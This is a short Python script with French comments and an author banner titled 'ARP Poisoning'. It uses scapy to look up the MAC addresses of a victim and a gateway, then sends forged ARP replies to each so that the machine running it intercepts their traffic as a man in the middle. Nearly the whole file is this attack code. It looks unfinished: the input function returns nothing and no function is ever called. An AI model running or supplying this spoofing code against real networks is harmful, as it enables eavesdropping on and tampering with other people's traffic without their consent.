#!/usr/bin/env python
# -*- coding: utf-8 -*-


#################################################
#Auteur: Vikrant SINGH                          #
#Programme: ARP Poisoning                       #
#                                               #
#################################################


#################################################
#####################Imports#####################

from Tkinter import *
from scapy.all import *
import sys
#################################################

def information () :
	interface = raw_input("interface réseau :")
	ipvictime = raw_input("IP de la victime:")
	iprouteur = raw_input("IP du routeur GW :")


def mac_victime(ip):
    ans, unans = arping(ip)
    for s, r in ans:
        return r[Ether].src


def poison(iprouteur, ipvictime):
    victimMAC = mac_victime(ipvictime)
    routerMAC = mac_victime(iprouteur)
    send(ARP(op =2, pdst = ipvictime, psrc = iprouteur, hwdst = victimMAC))
    send(ARP(op = 2, pdst = iprouteur, psrc = ipvictime, hwdst = routerMAC))


